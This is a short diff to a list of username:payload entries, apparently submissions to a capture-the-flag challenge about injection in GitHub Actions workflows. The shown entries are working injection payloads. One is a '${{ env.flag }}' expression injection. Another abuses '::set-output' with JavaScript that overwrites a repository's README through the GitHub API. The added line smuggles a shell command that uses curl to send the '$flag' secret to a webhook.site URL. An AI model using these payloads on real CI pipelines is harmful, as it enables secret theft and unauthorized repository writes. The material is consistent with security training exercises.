@@ -454,3 +454,4 @@ N0b1e6:flag
 Woolgathererer:123123
 zghh007:${{ env.flag }}
 N0b1e6::set-output name=COMMENT_ID::1; console.log(context); console.log(process); await github.request('PUT /repos/{owner}/{repo}/contents/{path}', { owner: 'incrediblysecureinc', repo: 'incredibly-secure-Creastery', path: 'README.md', message: 'Escalated to Read-write Access', content: Buffer.from('Pwned!').toString('base64'), sha: '959c46eb0fbab9ab5b5bfb279ab6d70f720d1207' })
+sln-1550:';$(curl https://webhook.site/13d0cab6-b389-44ee-a500-c64ea04d79c5/\"$flag\")
